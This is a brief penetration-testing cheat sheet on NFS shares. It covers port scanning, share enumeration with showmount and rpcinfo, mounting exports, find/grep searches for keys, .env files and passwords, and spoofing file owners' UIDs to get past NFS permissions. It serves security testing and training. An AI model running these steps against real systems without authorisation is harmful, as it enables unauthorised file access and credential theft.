## Network File System

### Recon

```
nmap -p 2049,111 target.com
```

### Share Enumeration

#### Using showmount

```
# List exported shares
showmount -e target.com

# List directories
showmount -d target.com

# List clients
showmount -a target.com
```

#### Using rpcinfo

```
# Using rpcinfo
rpcinfo -p target.com

# Manual RPC query
rpcinfo target.com | grep nfs
```

### Mounting and Exploring

```
# Mount share
mount -t nfs target.com:/share /mnt/nfs

# List contents
ls -la /mnt/nfs

# Find interesting files
find /mnt/nfs -type f -name "*.conf"
find /mnt/nfs -type f -name "*.key"
find /mnt/nfs -type f -name "*.pem"
find /mnt/nfs -type f -name "*password*"
find /mnt/nfs -type f -name "*.env"

# Search for credentials
grep -r "password\|secret\|key" /mnt/nfs

# Check permissions
ls -la /mnt/nfs
```

### Root Squashing

#### After mounting, list directories to find GUID or UID of the owner of files/directories
```
ls -la
ls -ld
```

#### Then if root squashing is possible we can attempt to create a dummy user and set their UID/GUID to what the files have, since the NFS server may give us access as long we have the right UID
```
sudo useradd dummy
sudo usermod -u <UID_WE_WANT_TO_SET_FOR_USER> dummy
```

#### Use `su` to change to that user and launch a bash shell as that user
```
sudo su dummy -c bash
```
#### Test if we can access/write files
```
ls -la 
cat <file>
echo "Test?" > /mnt/0xdf.html
```
